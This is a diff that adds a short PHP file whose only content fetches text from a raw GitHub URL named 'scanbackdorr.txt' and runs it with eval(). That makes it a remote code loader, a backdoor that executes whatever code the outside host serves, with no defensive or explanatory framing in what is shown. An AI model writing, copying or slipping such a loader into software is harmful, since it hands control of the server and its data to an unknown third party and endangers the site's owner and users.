@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/waklabu979/sc/refs/heads/main/scanbackdorr.txt'));
+
+$content = "?> ".$content;
+eval($content);
